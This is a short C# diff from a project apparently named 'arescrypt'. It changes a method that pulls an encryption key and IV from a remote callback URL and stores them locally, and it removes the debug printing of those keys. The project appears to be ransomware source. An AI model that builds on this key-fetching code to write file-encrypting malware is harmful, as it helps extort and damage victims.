@@ -53,7 +53,7 @@ namespace arescrypt
             }
         }
 
-        public List<string> GetCryptoKeys()
+        public UserData GetCryptoKeys()
         {   // This method ONLY needs to be called when it has been determined that the account has been verified properly.
 
             string url = Configuration.callbackURL +
@@ -74,17 +74,13 @@ namespace arescrypt
                         userData.encIV = (string)jsonObject.SelectToken("encIV");
 
                         Miscellaneous.SetDATFileData(userData);
-
-                        Console.WriteLine("Account Verified? " + (bool)jsonObject.SelectToken("verifiedAccount"));
-                        Console.WriteLine("Encryption Key: " + userData.encKey);
-                        Console.WriteLine("Encryption IV: " + userData.encIV);
                     }
                 }
                 catch (WebException exc)
-                { Console.WriteLine("Caught exception: " + exc.Message); return new List<string> { exc.Message }; }
+                { Console.WriteLine("Caught exception: " + exc.Message); return userData; }
             }
 
-            return new List<string> { };
+            return Miscellaneous.GetDATFileData();
         }
         
     }
